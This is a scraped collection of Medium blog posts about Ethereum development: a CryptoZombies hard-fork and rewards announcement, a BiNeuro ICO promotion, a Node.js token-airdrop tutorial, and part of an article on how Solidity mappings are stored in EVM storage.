"https://medium.com/@DilankaLoom", "publish_date": "2018-03-22", "last_modified_date": "2019-08-19", "readtime": "5.20", "claps": 2103, "voters": 160, "content": "CryptoZombies has come to a fork in the road (+Surprise Rewards \ud83c\udf89)\ud83d\udc7d Dilanka | Loom NetworkFollowMar 22, 2018 \u00b7 6 min readYour Zombies are being prepared to journey into their own DAppChainIn just 6 months of launch, CryptoZombies has helped over 135,242+ developers master Solidity and Ethereum smart contracts.\u2026and now, it\u2019s time for your Zombies to evolve \u2014 INTO Blockchain Zombies.That\u2019s right.We\u2019re hard forking CryptoZombies onto its own DAppChain.Since every evolution depends on change, I brought some exciting news JUST FOR YOU...As in, I am going to reveal some surprise rewards for being a loyal early adopter.That means YOU will now get the chance to earn some serious perks for your efforts on CryptoZombies.Please, contain your excitement for your own safety.It\u2019s our way of saying \u201cThank You\u201d.But, you\u2019ll still have to do some work to earn it \ud83d\ude0eMatter of fact \u2014 You\u2019ll have until \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 @ 12:00:00 UTC to earn these insane perks, so be sure to read this entire post to find out how.Update: We\u2019ve postponed the deadline to April 20th at the same time to account for delays in translating Lesson 6. So you have an extra week to claim your rewards!Before we get to that\u2026First\u2026Long before the world was full of Zombies\u2026When we originally started CryptoZombies late last year, there weren\u2019t many educational resources for upcoming blockchain developers.So we decided to take it upon ourselves to create a kick-ass, interactive \u201ccode school\u201d for learning Solidity and Ethereum Smart Contracts.The idea was simple: Get beginners to master Solidity development in a fun, interactive manner where they code their own zombie game.Since then, it has been such a hit that\u2026\u2026\u2026CryptoZombies is now the World\u2019s Most Trusted \u201ccode school\u201d for learning Solidity and Ethereum Smart Contracts.\u2026and it\u2019s about to get EVEN BETTER.HOW\u2026you ask?We are HARD FORKING CryptoZombies.io onto it\u2019s own DAppChainAs you know, we already launched the world\u2019s FIRST DAppChain app called DelegateCall recently. *(What is a DAppChain?)DelegateCall is meant to be a fully operational implementation of our technology.DelegateCall is running smoothly on its own DAppChain because of the Loom SDK \u2014 which does all the heavy lifting for developers that are building the next generation of fully scalable DApps on dedicated DAppChains.In the future, we are expecting THOUSANDS of decentralized DApps to be running on Loom DAppChains.Until then, please help me welcome CryptoZombies.io as our second DAppChain App.Why Fork CryptoZombies.io?The reasons for hard forking CryptoZombies are threefold:It demonstrates that the Loom SDK can be used to store all sorts of data (like: game play states, character data, lesson progress, etc) on scalable DAppChains.Achievements will be verifiable on the blockchain, so students could literally \u201cprove\u201d their knowledge to anyone (including employers)We want to demonstrate a really cool feature of DAppChains: Inter-blockchain relay. When CryptoZombies is on its own DAppChain, you\u2019ll be able to import your lesson progress into DelegateCall, and have it show an indicator on your profile (as a badge) so that everyone knows your level of Solidity understanding.We don\u2019t want you to get kidnapped, So PLEASE Don\u2019t Tell Anyone about these perks.That\u2019s right.If you are one of our loyal, hardworking, early adopter students (i.e: original gangsters) \u2014 you have the chance to earn some serious rewards and perks.You earned it.The rewards and perks will be given in TWO separate tiers:Those who have finished SOME, but NOT all lessons on CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC.Those who HAVE finished ALL the lessons on CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC.So, WTF does that mean?1. Rewards for students who have finished SOME but NOT ALL the lessonsIn other words, if you are an existing CryptoZombies student (and haven\u2019t finished all the lessons by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018), you will STILL (automatically) get the following rewards:1 x LOOM Token (Regular Loom Membership)10 x DelegateCall TokensRare item on Etherboy (our upcoming DAppChain Game)1 x card pack on Battleground (our upcoming DAppChain Game)Again, rewards will be automatically credited to your CryptoZombies account, you don\u2019t have to \u201cdo anything\u201d to get them.Plus \u2014 Much like Santa Claus, we KNOW if you\u2019ve actually finished the lessons or not \ud83d\ude09So, no cheating.But, if you are AMBITIOUS, you can\u2026.2. Finish ALL 6 LESSONS by the deadline and SUPERCHARGE your Perks \ud83c\udf89Now, if you are super dedicated and have worked very hard to finish ALL 6 LESSONS on CryptoZombies, we want to acknowledge that.Let\u2019s take a moment to respect all the hustlers staying up all night studying Solidity on CryptoZombiesSome of you are drinking obscene amounts of caffeine and other questionable substances to trick your body into not sleeping so you could finish lessons on CryptoZombies.Kudos \ud83d\ude47We don\u2019t recommend putting your health at risk, but we do respect the hustle.\u2026and to show our respect, if you finish ALL 6 LESSONS of CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th 2018 (12:00:00 UTC), you\u2019ll be rewarded with additional perks.If you finish ALL 6 Lessons by the deadline, you\u2019ll be getting:10 x LOOM Tokens (Developer tier Loom Membership)100 x DelegateCall TokensLegendary genesis item on \u201cEtherboy in Blockchain World\u201d (Upcoming DAppChain Game)Special-edition card with your very own zombie (genetically cloned from your CryptoZombie\u2019s DNA) on \u201cCryptoZombies Battleground\u201d (Upcoming DAppChain Game)If you have finished ALL lessons are are just waiting for Lesson 6, RELAX \u2014 CryptoZombies Lesson 6 will be out before the \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th Deadline.Remember, the reward cutoff date is \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th, 12:00:00 UTC \u2014 and you MUST COMPLETE ALL 6 Lessons on CryptoZombies to qualify for the additional perks.TL;DR:We already released our first DAppChain App (called DelegateCall), and we are hard-forking the world-famous CryptoZombies.io into its own DAppChain.Rewards will be given to the most loyal and hardworking students of CryptoZombies (if they qualify). See details above on how to qualify. (Deadline for Rewards: \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC)Once hard-forked, The CryptoZombies DAppChain will have inter-blockchain relay with the Delegatecall DAppChain. When CryptoZombies is on its own DAppChain, you\u2019ll be able to import your lesson progress into DelegateCall, and have it show an indicator on your profile (as a badge) so that everyone knows your level of Solidity understanding.Students who finished ALL CryptoZombies lessons will have a special badge on DelegateCall that proves their understanding of the blockchain.DelegateCall Job Board (Coming Soon) will show candidate status and relevant achievements automatically for employers looking to hire blockchain developers.The hard-fork also demonstrates that the Loom SDK can be used to build all sorts of applications (like: games, social networks, etc) on a fully scalable DAppChain to fuel the future decentralization of the Internet.Good luck! Cryptozombies are waiting.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 5, "tags": ["Cryptocurrency", "Blockchain", "Ethereum", "Programming", "Coding"]}, {"title": "BOGDAN FIEDUR joins advisory board of BiNeuro", "post_link": "https://medium.com/@bineuro.ico/bogdan-fiedur-joins-advisory-board-of-bineuro-527537bc881f?source=search_post", "author_name": "BiNeuro", "author_link": "https://medium.com/@bineuro.ico", "publish_date": "2018-06-26", "last_modified_date": "2018-06-26", "readtime": "0.96", "claps": 1591, "voters": 149, "content": "BOGDAN FIEDUR joins advisory board of BiNeuroBogdan Fiedur \u2014 TOP ICO Advisor. Full Stack and Ethereum/Solidity smart contract developerBiNeuroFollowJun 26, 2018 \u00b7 1 min readBogdan Fiedur about BiNeuro: \u201cBiNeuro is absolutely unique project in the digital advertising world. BiNeuro \u2014 a synthesis of the Artificial Intelligence and Blockchain technology and it increase effectiveness of digital advertising campaigns by at least 50%!\u201dBogdan Fiedur is a smart contract developer, crypto-investor, entrepreneur and President of Blockainexperts. He has over 20 years of IT experience and has been involved in blockchain development during last 3 years.https://www.youtube.com/watch?v=LIpzFoO3d8MDmitry Pavlov, mathematician, sustaining member of the New York Academy of Sciences and IEEE, founder of UCT World Corporation about BiNeuro product:\u201cIn 2017, UCT WORLD CORPORATION was nominated to TOP 10 of Google \u2018s fastest growing partners, owing to the BiNeuro system. BiNeuro is already working and is able to replace human with an AI based neural network that can learn and accumulate experience.\u201cFor more information \ud83d\udc49 Click hereJoin BiNeuro Token Sale \ud83d\udc49 https://bineuro.com/web/Sign up Official Telegram BiNeuro Channel \ud83d\udc49 https://t.me/BiNeuroChannelDo you want to see BiNeuro in action? Welcome to the YouTube ICO Chart Channel! Click the \u201cLike\u201d button and subscribe to the channel! \ud83d\udc49https://www.youtube.com/channel/UC1AQ3O1md5ChAVK-fkE6cwg", "responses": 0, "tags": ["ICO", "Token Sale", "Adwords", "Advertising", "PPC Marketing"]}, {"title": "How To Script An Automatic Token Airdrop for 40k subscribers", "post_link": "https://medium.com/hackernoon/how-to-script-an-automatic-token-airdrop-for-40k-subscribers-e40c8b1a02c6?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2018-01-28", "last_modified_date": "2019-05-13", "readtime": "11.5", "claps": 683, "voters": 130, "content": "Photo by Dose Media on UnsplashHow To Script An Automatic Token Airdrop for 40k subscribersPablo RuizFollowJan 28, 2018 \u00b7 12 min readI\u2019m happy to announce that I recently joined the Polymath team as a Solidity Engineer to spearhead the development of a new standard for blockchain-based securities tokens. \ud83c\udf86\ud83c\udf86\ud83c\udf86In this article/tutorial I\u2019m going to go over the process of writing a node.js script that performs an automatic token distribution/airdrop to a list of Ethereum addresses. I\u2019m going to use the code we wrote for the Polymath Token Distribution process \u2014 which is a pretty standard ERC20 token \u2014 and go over the script I built to handle the automatic distribution of the tokens.Originally, I was planning on running this script through Infura so I didn\u2019t have to run a full-node locally. That required signing the transactions offline, which I was doing by using a couple of handy functions from the latest version of web3. Unfortunately, even though that worked like a charm on testrpc and on Ropsten, on Mainnet it was a disaster. Transactions were not getting picked up, it was extremely slow, costly and unreliable. If you want to check it out anyways, you can refer to this early commit.The Token and Token Distribution contractsOne of my first tasks at Polymath was helping the team iron out the Token and Token Distribution smart contracts that we will use in the upcoming days to launch the POLY Token and perform the launch airdrop to the 40k of the people that subscribed to the platform.I\u2019m not going to go into much detail about the code of these contracts, but you can take a look at them as they have been made public on Polymath\u2019s Github Repository.Here\u2019s a few things that are worth mentioning about the PolyToken.sol and PolyDistribution.sol smart contracts, that will help make sense of the rest of the tutorial:PolyToken.sol is the contract for the POLY token. It\u2019s a pretty standard ERC20 token contract with a fixed supply.PolyDistribution.sol is the contract that will handle the initial distribution of the tokens. We separated the allocation of tokens for presale investors, advisors, founders, etc. from the airdrop as the process was meant to be very different. In our case, we are going to use 10 million tokens (from the 1 billion being issued) for the airdrop, giving away 250 tokens to 40,000 people. The most important function to look at for this tutorial is airdropTokens(), let\u2019s review it:function airdropTokens(address[] _recipient) public onlyOwnerOrAdmin {    require(now >= startTime);    uint airdropped;    for(uint i = 0; i< _recipient.length; i++)    {        if (!airdrops[_recipient[i]]) {          airdrops[_recipient[i]] = true;          require(POLY.transfer(_recipient[i], 250 * decimalFactor));          airdropped = airdropped.add(250 * decimalFactor);        }    }    AVAILABLE_AIRDROP_SUPPLY = AVAILABLE_AIRDROP_SUPPLY.sub(airdropped);    AVAILABLE_TOTAL_SUPPLY = AVAILABLE_TOTAL_SUPPLY.sub(airdropped);    grandTotalClaimed = grandTotalClaimed.add(airdropped);  }What airdropTokens() basically does is to distribute (calling ERC20\u2019s transfer() function) 250 POLY tokens \u2014 which are regular ERC20 tokens \u2014 to an array of addresses. For each address we receive, we transfer 250 POLY to them as long as they haven\u2019t already received their allocation already. After the process finishes, we update the available supply and keep track of how many tokens have already been distributed.For this tutorial we\u2019ll only focus on distributing the tokens meant for airdrop recipients. As can be observed above, these tokens are allocated and transferred with no vesting or cliff periods. The case is not the same for the other type of allocations, those have some special conditions that need to be met before they can be transferred/sold.If you are interested in seeing how the rest of the allocations are done, you can review the setAllocation() and transferTokens() functions from PolyDistribution.sol .The Token Distribution EventWhen the token distribution date arrives, what our team will need to do is to distribute the tokens to each account that signed up for the airdrop. That data has been collected over the past few months from the comapny\u2019s site and it contains the addresses of every account that signed up for the airdrop and that was successfully verified during the KYC verification process. The collected data we need for the airdrop process is stored in a CSV file that has just 1 column: The Ethereum address of each subscriber.Note that the script could be easily modified to contain not only the address of the subscriber but also how many tokens they should be transferred. In this case, since we decided to give 250 POLY to everyone, this was not necessary and we opted to hardcode that number in the distribution smart contract.Doing an airdrop, in theory, is quite simple. All we would need to do is to call the transfer() function of the ERC20 token for each address we collected.The above could be done by manually executing the transfer() function if we had just a handful of subscribers, but with potentially thousands of people that will want to get a hold of their tokens the moment it\u2019s launched, doing the above, one by one, would be very time consuming.Automating the Token Distribution Process Through a Node.js Script.Having explained how the token and distribution contracts work, let\u2019s dive into the JS code. We need to do a few things in order to automate the token distribution process:We have to read the CSV file and process it to remove blank or invalid entries. We assume some of the data will be missing or some addresses might be erroneous, so we\u2019ll make sure to take those out before we send them to the blockchain.We\u2019ll pack the addresses in multiple arrays that contain 80 addresses each. Why 80? After several tests, that was the ideal number given the gas cost of transferring tokens. Depending on what you are trying to do with each entry, it might cost more or less gas per transaction, and you should pack entries accordingly so the transaction doesn\u2019t run out of gas and rolls back.Once we have our set of arrays we\u2019ll pass each of them to the airdropTokens() function on the smart contract which will loop through the array and call the transfer() method for each subscriber to send them their tokens.Afterwards, we\u2019ll run another process to get all the Transfer events generated by the distribution contract so we can review that the distributions went well. (We\u2019ll sum the tokens distributed, which should match the data we had on file).Let\u2019s start by setting the project up:If you want to skip the whole tutorial and just run the script, you can find the full source code here.Set upRun the commands below to set up a brand new project and install the required dependencies:$ mkdir distributionTutorial$ npm init$ truffle init$ npm install web3 fast-csv truffle-contract ethereumjs-testrpc  --saveFor this project we will be using a few libraries and frameworks:Truffle: Which allows us to easily compile, migrate and interact with our contracts from JavaScript.Fast-csv: To read and process the data form a CSV file.You should also install Parity and sync it on Ropsten (or whichever testnet / mainnet you prefer). The following command has worked for me pretty well:parity \u2014 chain ropsten \u2014 rpcapi \u201ceth,net,web3,personal,parity\u201d \u2014 unlock <THE ACCOUNT YOU WANT TO UNLOCK> \u2014 password $HOME/password.fileNext, copy the Polymath Distribution smart contracts to the contracts folder of your project. The files can be found here: https://github.com/PolymathNetwork/polymath-token-distribution/tree/master/contractsOpen truffle.js and replace its content with the following code:module.exports = {  networks: {   development: {      host: 'localhost',      port: 8545,      network_id: '*', // Match any network id      gas: 3500000,    },    ropsten: {      host: 'localhost',      port: 8545,      network_id: '3', // Match any network id      gas: 3500000,      gasPrice: 50000000000    },  },  solc: {    optimizer: {      enabled: true,      runs: 200,    },  },};The above will allow us to run truffle migrate --network ropsten to deploy the contracts to Ropsten testnet. Before being able to deploy the contracts to Ropsten we need to create the deployment script for truffle. Create a new file named 2_deploy_contracts.js inside the migrations folder with the following code:var PolyToken = artifacts.require('./PolyToken.sol');var PolyDistribution = artifacts.require('./PolyDistribution.sol');module.exports = async (deployer, network) => {  let _now = Date.now();  let _fromNow = 60 * 5 * 1000; // Start distribution in 1 hour  let _startTime = (_now + _fromNow) / 1000;  await deployer.deploy(PolyDistribution, _startTime);  console.log(`    ---------------------------------------------------------------    --------- POLYMATH (POLY) TOKEN SUCCESSFULLY DEPLOYED ---------    ---------------------------------------------------------------    - Contract address: ${PolyDistribution.address}    - Distribution starts in: ${_fromNow/1000/60} minutes    - Local Time: ${new Date(_now + _fromNow)}    ---------------------------------------------------------------  `);};The code above will be run when you execute truffle migrate --network ropsten . It will deploy the PolyDistribution contract to Ropsten (which also handles the deployment of the POLY Token contract), setting the _startTime to five minutes from now. Make sure the_startTime variable is correctly set and that you attempt to do the airdrop once the _startTime has been reached, else the execution will fail. We are using _startTime to prevent people from withdrawing tokens before the token distribution event begins.Go ahead and run truffle migrate --network ropsten if everything went well you should see an output similar to this on the console:The tx hashes and contract address will be different for you.If you don\u2019t see this output or you get an error make sure you are running Parity and that is fully synced. Also, make sure you have enough ether in the account being used to deploy the contracts on the Ropsten testnet.Take note of the address of the Poly Distribution contract we just deployed, we\u2019ll use it later.Reading the CSV FileLet\u2019s start working on the script that will do the automatic allocation of POLY tokens to the addresses that signed up for the airdrop.First, create a new folder called scripts and create a new file inside this folder called csv_allocation.js This file will contain all the code for running the allocation process.Before we move forward with the code that reads the CSV file and processes it, let\u2019s add the file to the project. We need a 1 column CSV file named airdrop.csv that has an entry for each address that will receive tokens. Create this file and add it to the scripts/data folder.If you want to easily test the airdrop, you can generate this file yourself with \u201crandom\u201d addresses you control. One simple way to do that is to run testrpc and specify how many accounts you want to create, like so:testrpc -m \"word1 word2 word3...\" -a 300The command above will generate 300 accounts from the mnemonic you provide it with. Copy the addresses to airdrop.csv .Back in our csv_allocation.js script, let\u2019s add the necessary code to be able to read the airdrop.csv. Add the following code to csv_allocation.js:var fs = require('fs');var csv = require('fast-csv');var BigNumber = require('bignumber.js');let polyDistributionAddress = process.argv.slice(2)[0];let BATCH_SIZE = process.argv.slice(2)[1];if(!BATCH_SIZE) BATCH_SIZE = 80;let distribData = new Array();let allocData = new Array();function readFile() {  var stream = fs.createReadStream(\"scripts/data/airdrop.csv\");let index = 0;let batch = 0;console.log(`    --------------------------------------------    --------- Parsing distrib.csv file ---------    --------------------------------------------******** Removing beneficiaries without address data  `);var csvStream = csv()      .on(\"data\", function(data){          let isAddress = web3.utils.isAddress(data[0]);          if(isAddress && data[0]!=null && data[0]!='' ){            allocData.push(data[0]);index++;            if(index >= BATCH_SIZE)            {              distribData.push(allocData);              allocData = [];              index = 0;            }}      })      .on(\"end\", function(){           //Add last remainder batch           distribData.push(allocData);           allocData = [];           setAllocation();      });  stream.pipe(csvStream);}if(polyDistributionAddress){  console.log(\"Processing airdrop. Batch size is\",BATCH_SIZE, \"accounts per transaction\");  readFile();}else{  console.log(\"Please run the script by providing the address of the PolyDistribution contract\");}You can now run the script by doing:$ node scripts/csv_allocation.js 0x0... 80// Where 0x0... is the address of the PolyDistribution contract we previously deployed to Ropsten.// 80 is the batch size we want to process. (How many accounts per array we want to process and send to the airdropTokens function) Can be omitted, defaults to 80.Let\u2019s review the code:First, we import the libraries that will allow us to read files and process the CSV file.Then, if you look at the last few lines of code, you will see we are accessing the parameters passed when running the script and, if there\u2019s the address of the PolyDistribution contract, we call the readFile() function.What the readFile() function does is accessing airdrop.csv file and it reads it line by line. At each line, we make sure that the value is not null or empty and we also use web3\u2019s isAddress() function to verify that the address passed is valid. If the address is ok, we add it to an array that holds the processed data we\u2019ll use to build each Ethereum transaction. Once the data has been fully processed and we reach the end of file, we call the function that will take each array of 80 addresses and process them.Note that this function is very simplistic and could be further improved to detect token amounts that would exceed the POLY supply, duplicate addresses, etc. All of these cases are still taken care of on the contract side, but it would be nice if we could save us a few transaction calls to Ethereum.Processing the Token DistributionNow that we have our data processed into an array \u2014 We should have the array called distribData containing a handful of arrays, each with 80 addresses at most \u2014 we are going to call the airdropTokens() function from the smart contract for each one of them.const delay = ms => new Promise(resolve => setTimeout(resolve, ms));async function setAllocation() {console.log(`    --------------------------------------------    ---------Performing allocations ------------    --------------------------------------------  `);let accounts = await web3.eth.getAccounts();let polyDistribution = await PolyDistribution.at(polyDistributionAddress);  for(var i = 0;i< distribData.length;i++){try{      let gPrice = 50000000000;      console.log(\"Attempting to allocate 250 POLYs to accounts:\",distribData[i],\"\\n\\n\");      let r = await polyDistribution.airdropTokens(distribData[i],{from:accounts[0], gas:4500000, gasPrice:gPrice});      console.log(\"---------- ---------- ---------- ----------\");      console.log(\"Allocation + transfer was successful.\", r.receipt.gasUsed, \"gas used. Spent:\",r.receipt.gasUsed * gPrice,\"wei\");      console.log(\"---------- ---------- ---------- ----------\\n\\n\")    } catch (err){      console.log(\"ERROR:\",err);    } }}Let\u2019s take a closer look at this function. What setAllocation() from the JS script does is simply traversing the distribData array we populated with the processed data from the csv file, then for each array of entries we proceed to execute airdropTokens() on the smart contract, passing the array.For each batch of addresses we process, we retrieve the event log and print how much gas was spent, just as a way to make sure the process succeeded.Every batch should spend about the same amount of gas. If there\u2019s a batch that costed less gas, it means that some of the addresses within that batch were not transferred tokens, probably because they had already been transferred tokens before.Reading the Transfer Event from the ERC20 Token to Verify the TransactionsOne last thing we can do before calling it a day is to access the event log for the ERC20 POLY token Transfer() function so we can quickly check how many accounts got their tokens.Add the following lines at the end of setAllocation() function:console.log(\"Distribution script finished successfully.\")  console.log(\"Waiting 2 minutes for transactions to be mined...\")  await delay(90000);  console.log(\"Retrieving logs to inform total amount of tokens distributed so far. This may take a while...\")let polytokenAddress = await polyDistribution.POLY({from:accounts[0]});  let polyToken = await PolyToken.at(polytokenAddress);var sumAccounts = 0;  var sumTokens = 0;var events = await polyToken.Transfer({from: polyDistribution.address},{fromBlock: 0, toBlock: 'latest'});  events.get(function(error, log) {      event_data = log;      //console.log(log);      for (var i=0; i<event_data.length;i++){          //let tokens = event_data[i].args.value.times(10 ** -18).toString(10);          //let addressB = event_data[i].args.to;          sumTokens += event_data[i].args.value.times(10 ** -18).toNumber();          sumAccounts +=1;          //console.log(`Distributed ${tokens} POLY to address ${addressB}`);}      console.log(`A total of ${sumTokens} POLY tokens have been distributed to ${sumAccounts} accounts so far.`);  });The code above adds a timeout so we give some time for the transactions to finish getting mined and then we get the Transfer() event for the POLY token, filtering the events by the from field which is the PolyDistribution contract.Then, we count the events and how many tokens were distributed. We can use that data to compare it with our original file. We could also list each address that got tokens, or add a function that compares the CSV file with the event log data, if we wanted to get fancy.Executing the ScriptThat\u2019s it! Let\u2019s give the script a try. Run the following command:$ node scripts/csv_allocation.js 0x0...// Replace 0x0... with the address of the PolyDistribution contract you deployed to RopstenIf everything went well, you should see something like this on the console:And if you go to Etherscan and enter address of the PolyDistribution contract you deployed, you should see something like this:If you can see the Transfer() events for each account you had on your CSV file, then congrats! You have successfully performed your airdrop!Thanks for reading through this tutorial, I hope you enjoyed reading it as much as I did writing it. Stay tuned for more articles, tutorials and stories related to my adventures building the next-generation platform for tokenized securities on the blockchain!If you are doing your own airdrop and need advice, feel free to reach out to me on the comments section below, or send me an email to me[at]pabloruiz[dot]co and I\u2019ll do my best to reply promptly.", "responses": 14, "tags": ["Ethereum", "Smart Contracts", "Programming", "Development", "ICO"]}, {"title": "Diving Into The Ethereum VM Part 3 \u2014 The Hidden Costs of Arrays", "post_link": "https://medium.com/@hayeah/diving-into-the-ethereum-vm-the-hidden-costs-of-arrays-28e119f04a9b?source=search_post", "author_name": "Howard", "author_link": "https://medium.com/@hayeah", "publish_date": "2017-08-24", "last_modified_date": "2018-06-18", "readtime": "10.2", "claps": 1123, "voters": 134, "content": "Diving Into The Ethereum VM Part 3 \u2014 The Hidden Costs of ArraysHowardFollowAug 24, 2017 \u00b7 11 min readSolidity provides familiar data structures seen in other programming languages. Aside from simple values like numbers and structs, there are data types that can expand dynamically as more data is added. The three main categories of these dynamic types are:Mappings: mapping(bytes32 => uint256), mapping(address => string), etc.Arrays: []uint256, []byte, etc.Byte arrays. Only two kinds: string, bytes.In Part II of this series we\u2019ve seen how simpler types with fixed sizes are represented in storage.Fundamental values: uint256, byte, etc.Fixed sized arrays: [10]uint8, [32]byte, bytes32Structs that combine the above types.Storage variables that have fixed sizes are laid out one after another in storage, packing as tightly as possible in chunks of 32 bytes.(If this seems unfamiliar, read Diving Into The Ethereum VM Part II \u2014 Storage Cost)In this article we\u2019ll look into how Solidity supports more complex data structures. Arrays and mappings in Solidity may look familiar on the surface, but the way they are implemented gives them radically different performance characteristics.We\u2019ll start with mapping, which is the simplest of all three. It turns out that arrays and byte arrays are just mappings with fancier features.MappingLet\u2019s store a single value in a uint256 => uint256 mapping:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) items;    function C() {      items[0xC0FEFE] = 0x42;    }}Compile:solc --bin --asm --optimize c-mapping.solThe assembly:tag_2:  // Doesn't do anything. Should be optimized away.  0xc0fefe  0x0  swap1  dup2  mstore  0x20  mstore  // Storing 0x42 to the address 0x798...187c  0x42  0x79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c  sstoreWe can think of the EVM store as a key-value database, with each key limited to storing 32 bytes. Rather than using the key 0xC0FEFE directly, here the key is hashed to 0x798...187c, and the value 0x42 stored there. The hashing function used is the keccak256 (SHA256) function.In this example we don\u2019t see the keccak256 instruction itself because the optimizer had decided to precalculate the result and inline it in bytecode. We still see the vestige of this calculation, in the form of useless mstore instructions.Calculate The AddressLet\u2019s use some Python code to hash 0xC0FEFE to 0x798...187c. If you'd like to follow along, you'll need Python 3.6, or install pysha3 to get the keccak_256 hash function.Define two helper functions:import binasciiimport sha3# Convert a number to 32 bytes array.def bytes32(i):    return binascii.unhexlify('%064x' % i)# Calculate the keccak256 hash of a 32 bytes array.def keccak256(x):    return sha3.keccak_256(x).hexdigest()To convert numbers to 32 bytes:>>> bytes32(1)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01'>>> bytes32(0xC0FEFE)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\xfe\\xfe'To concatenate two byte arrays together, use the + operator:>>> bytes32(1) + bytes32(2)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02'To calculate the keccak256 hash of some bytes:>>> keccak256(bytes(1))'bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a'We now have enough to calculate 0x798...187c.The position of the store variable items is 0x0(since it is the first store variable). To get the address, concatenate the key 0xc0fefe with the position of items:# key = 0xC0FEFE, position = 0>>> keccak256(bytes32(0xC0FEFE) + bytes32(0))'79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c'The formula for calculating the storage address for a key is:keccak256(bytes32(key) + bytes32(position))Two MappingsLet\u2019s take the formula we have to calculate where values would be stored! Suppose we have a contract with two mappings:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) itemsA;    mapping(uint256 => uint256) itemsB;    function C() {      itemsA[0xAAAA] = 0xAAAA;      itemsB[0xBBBB] = 0xBBBB;    }}The position for itemsA position is 0, for key 0xAAAA:# key = 0xAAAA, position = 0>>> keccak256(bytes32(0xAAAA) + bytes32(0))'839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3'The position for itemsB position is 1, for key 0xBBBB:# key = 0xBBBB, position = 1>>> keccak256(bytes32(0xBBBB) + bytes32(1))'34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395'Let\u2019s verify these calculations with the compiler:$ solc --bin --asm --optimize  c-mapping-2.solThe assembly:tag_2:  // ... Omit memory operations that could be optimized away  0xaaaa  0x839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3  sstore  0xbbbb  0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395  sstoreAs expected.KECCAK256 in AssemblyThe compiler was able to pre-calculate the address for a key because the values involved are constants. If the key used is a variable, then the hashing needs to be done with assembly code. Now we want to disable this optimization so we can see how hashing is done in assembly.It turns out to be easy to cripple the optimizer, by introducing an extra indirection with a dummy variable i:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) items;    // This variable causes constant folding to fail.    uint256 i = 0xC0FEFE;    function C() {      items[i] = 0x42;    }}The position for the variable items is still 0x0, so we should expect the same address as before.Compile with optimization, but this time without the hash pre-calculation:$ solc --bin --asm --optimize  c-mapping--no-constant-folding.solThe assembly annotated:tag_2:  // Load `i` onto the stack  sload(0x1)    [0xC0FEFE]  // Store the key `0xC0FEFE` in memory at 0x0, for hashing.  0x0    [0x0 0xC0FEFE]  swap1    [0xC0FEFE 0x0]  dup2    [0x0 0xC0FEFE 0x0]  mstore    [0x0]    memory: {      0x00 => 0xC0FEFE    }  // Store the position `0x0` in memory at 0x20 (32), for hashing.  0x20 // 32    [0x20 0x0]  dup2    [0x0 0x20 0x0]  swap1    [0x20 0x0 0x0]  mstore    [0x0]    memory: {      0x00 => 0xC0FEFE      0x20 => 0x0    }  // Starting at 0th byte, hash the next 0x40 (64) bytes in memory  0x40 // 64    [0x40 0x0]  swap1    [0x0 0x40]  keccak256    [0x798...187c]  // Store 0x42 at the calculated address  0x42    [0x42 0x798...187c]  swap1    [0x798...187c 0x42]  sstore    store: {      0x798...187c => 0x42    }The mstore instruction writes 32 bytes in memory. The memory is much cheaper, costing only 3 gas to read and write. The first half of the assembly \"concatenates\" the key and position by loading them into neighbouring chunks of memory: 0                   31  32                 63[    key (32 bytes)    ][ position (32 bytes) ]Then the keccak256 instruction hashes the data in that memory region. The cost depends on how much data is hashed:30 Paid for each SHA3 operation.6 Paid for each word of 32 bytes.For an uint256 key the gas cost is 42 (30 + 6 * 2).Mapping Large ValuesEach storage slot can only store 32 bytes. What happens if we try to store a struct that\u2019s larger?pragma solidity ^0.4.11;contract C {    mapping(uint256 => Tuple) tuples;    struct Tuple {      uint256 a;      uint256 b;      uint256 